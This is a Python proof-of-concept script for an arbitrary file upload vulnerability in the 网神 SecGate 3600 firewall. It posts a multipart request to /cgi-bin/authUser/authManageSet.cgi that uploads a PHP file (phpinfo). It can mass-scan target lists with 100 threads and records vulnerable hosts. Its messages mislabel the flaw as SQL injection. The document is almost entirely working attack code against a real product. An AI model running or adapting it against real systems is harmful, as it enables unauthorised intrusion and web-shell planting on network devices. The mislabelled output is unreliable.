# 网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 POC
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """     ____            ____ ____  _       _____  __    ___   ___  
 / ___|  ___  ___/ ___/ ___|| |     |___ / / /_  / _ \ / _ \ 
 \___ \ / _ \/ __\___ \___ \| |       |_ \| '_ \| | | | | | |
  ___) |  __/ (__ ___) |__) | |___   ___) | (_) | |_| | |_| |
 |____/ \___|\___|____/____/|_____| |____/ \___/ \___/ \___/                                                                                                          
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 ")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/cgi-bin/authUser/authManageSet.cgi'
    url = target + payload_url
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "574",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0"

    }
    data = f"""
        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--"""
     
    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=10,verify=False)
        # res1 = requests.post(url=target+'/attachements/vulntest.php',headers=headers,timeout=10,verify=False)
        if 'File is valid, and was successfully uploaded' in res.text :
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该站点:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()